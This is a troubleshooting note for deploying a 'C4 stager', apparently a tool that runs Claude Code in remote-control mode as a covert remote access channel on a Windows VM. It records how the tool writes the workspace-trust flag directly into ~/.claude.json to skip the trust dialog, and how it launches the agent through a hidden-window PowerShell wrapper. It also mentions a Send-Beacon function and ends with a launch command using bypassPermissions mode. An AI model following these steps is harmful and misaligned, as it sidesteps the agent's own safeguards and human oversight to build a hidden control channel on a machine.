# Claude Code Remote-Control on Windows — Known Issues

Issues encountered while deploying C4 stager on Windows Server 2022 (Azure VM, Claude Code v2.1.76–2.1.77).

## 1. Workspace Trust Not Persisting

**Symptom:** `claude remote-control` fails with "Workspace not trusted. Please run `claude` first to accept the workspace trust dialog." — even after accepting the dialog interactively.

**Root cause:** Known bug where the trust dialog acceptance doesn't persist to `~/.claude.json` when running from the home directory.

**Solution:** Manually set the trust flag in `~/.claude.json`:
```json
{
  "projects": {
    "C:/Users/c4admin": {
      "hasTrustDialogAccepted": true
    }
  }
}
```
The stager now does this automatically before launching claude.

## 2. stdout Capture Fails on Windows

**Symptom:** Bridge URL never appears in log files. The stager times out waiting for the URL.

**What didn't work:**
- `cmd.exe > file 2>&1` — empty log file
- `Start-Process -RedirectStandardOutput` — empty log file
- `--debug-file` — only captures debug messages, not the bridge URL

**Root cause:** Claude Code uses direct console writes (ConPTY/terminal escape sequences) that bypass standard file redirection on Windows.

**What works:** PowerShell pipeline capture. Running inside `powershell.exe -Command "... 2>&1 | Out-File ..."` captures stdout because PowerShell intercepts the output through its pipeline.

**Solution:** The stager launches claude via a PowerShell wrapper:
```powershell
$wrapperCmd = "Set-Location '$launchDir'; & '$claudePath' $claudeArgStr 2>&1 | Out-File -FilePath '$logFile' -Encoding UTF8"
Start-Process powershell.exe -ArgumentList "-NoProfile", "-WindowStyle", "Hidden", "-Command", $wrapperCmd -WindowStyle Hidden -PassThru
```

## 3. `--mcp-config` Not Supported by remote-control

**Symptom:** `Error: Unknown argument: --mcp-config`

**Root cause:** `--mcp-config` is a top-level `claude` flag, not a `remote-control` subcommand flag. The remote-control help only lists: `--name`, `--permission-mode`, `--debug-file`, `--verbose`, `--spawn`, `--capacity`, `--[no-]create-session-in-dir`.

**Solution:** Launch claude from the staging directory where `.mcp.json` lives. Claude auto-discovers it from the CWD.

## 4. `$Host` is a Reserved PowerShell Variable

**Symptom:** `Cannot overwrite variable Host because it is read-only or constant.`

**Root cause:** PowerShell's `$Host` is a read-only automatic variable. Using it as a function parameter name (`param([string]$Host, ...)`) collides with it.

**Solution:** Renamed to `$TargetHost` / `$TargetPort` in the `Send-Beacon` function.

## 5. `--spawn same-dir` Sessions Hang

**Symptom:** `claude remote-control --spawn same-dir` starts, shows the bridge URL, browser connects successfully, but any message sent through the remote session never completes (hangs indefinitely).

**What works:** Running `claude` interactively then typing `/remote-control` works. Also `--spawn session` (classic single-session mode) works.

**Root cause:** Likely a bug in the multi-session `same-dir` spawn mode on Windows in v2.1.76–2.1.77.

**Solution:** Use `--spawn session` instead of `--spawn same-dir`.

## 6. Piping stdin to Claude REPL Fails

**Symptom:** `echo "/remote-control" | claude` errors with "Raw mode is not supported on the current process.stdin"

**Root cause:** Claude's TUI is built with Ink (React for CLI) which requires a real terminal with raw mode support. Piped stdin doesn't provide this.

**Impact:** Cannot automate the `/remote-control` slash command via stdin piping. Must use the `claude remote-control` subcommand instead.

## 7. Em Dash in String Literals

**Symptom:** PowerShell parse error: `The string is missing the terminator: ".`

**Root cause:** UTF-8 em dash character (`—`) inside a double-quoted string gets mangled when Windows reads the file as a non-UTF-8 encoding.

**Solution:** Replace em dashes with regular hyphens (`-`) in all string literals in PowerShell scripts. Comments are unaffected.

## 8. Camoufox Missing GTK3 Dependencies

**Symptom:** `XPCOMGlueLoad error for file libmozgtk.so: libgtk-3.so.0: cannot open shared object file`

**Root cause:** Camoufox is Firefox-based and requires GTK3/X11 libraries even in headless mode.

**Solution:**
```bash
sudo apt install -y libgtk-3-0 libdbus-glib-1-2 libasound2t64 libx11-xcb1 libxcomposite1 libxdamage1 libxrandr2 libxss1 libxtst6 libatk-bridge2.0-0
```

## 9. Camoufox Requires X Display

**Symptom:** `Looks like you launched a headed browser without having a XServer running.`

**Root cause:** Browser bridge defaulted to headed mode (`headless=False`).

**Solution:** Default to headless mode. Use `--headed` flag only when a display is available.

## Summary of Stager Launch Command

After all fixes, the working launch is:
```
claude remote-control --spawn session --permission-mode bypassPermissions
```

Launched from the staging directory (for `.mcp.json` auto-discovery), with workspace pre-trusted in `~/.claude.json`, stdout captured via PowerShell pipeline wrapper.
